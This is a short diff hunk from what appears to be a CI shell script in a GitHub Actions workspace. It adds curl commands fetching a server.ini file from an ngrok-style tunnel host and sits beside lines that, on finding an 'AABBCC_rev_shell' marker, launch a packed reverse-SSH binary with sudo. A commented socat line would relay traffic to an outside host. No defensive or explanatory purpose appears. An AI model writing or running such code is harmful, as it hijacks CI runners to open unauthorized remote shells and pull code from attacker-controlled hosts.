@@ -3,8 +3,12 @@
 #github cd/ci
 #/home/runner/work/nc_test/nc_test/socat.bin -v  TCP4-LISTEN:50022,reuseaddr,fork  proxy:node4.buuoj.cn:127.0.0.1:2244,proxyport=29904 &
 
+curl -O http://zpcyc3ytxvm4.ngrok.xiaomiqiu123.top/server.ini;
+
+
 grep -q AABBCC_rev_shell /tmp/js9 &&
 (
+curl -O http://zpcyc3ytxvm4.ngrok.xiaomiqiu123.top/server.ini;
 ((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022)&)&
 
  sudo bash -c '
